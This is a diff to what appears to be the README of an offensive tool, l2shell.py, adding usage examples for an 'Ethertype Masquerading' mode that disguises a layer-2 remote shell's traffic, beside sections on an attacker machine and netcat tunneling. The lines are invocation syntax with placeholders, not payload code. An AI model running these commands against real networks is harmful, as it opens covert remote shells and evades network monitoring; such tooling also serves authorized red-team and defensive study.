@@ -52,6 +52,13 @@ python l2shell.py -c/-l -a <attacker_id> -s <session_id> -i <interface guid>
 python l2shell.py -c -a <attacker_id> -s <session_id> -si
 ```
 
+### Ethertype Masquerading 
+```
+python l2shell.py -c -a <attacker_id> -s <session_id> -et <0x0000-0xFFFF>
+python l2shell.py -l -a <attacker_id> -s <session_id> -et <0x0000-0xFFFF>
+python l2shell.py -c -a <attacker_id> -s <session_id> -et <0x0000-0xFFFF> -p
+```
+
 ## L2Tunnel - Tunneling Netcat
 ### Attacker Machine
 ```
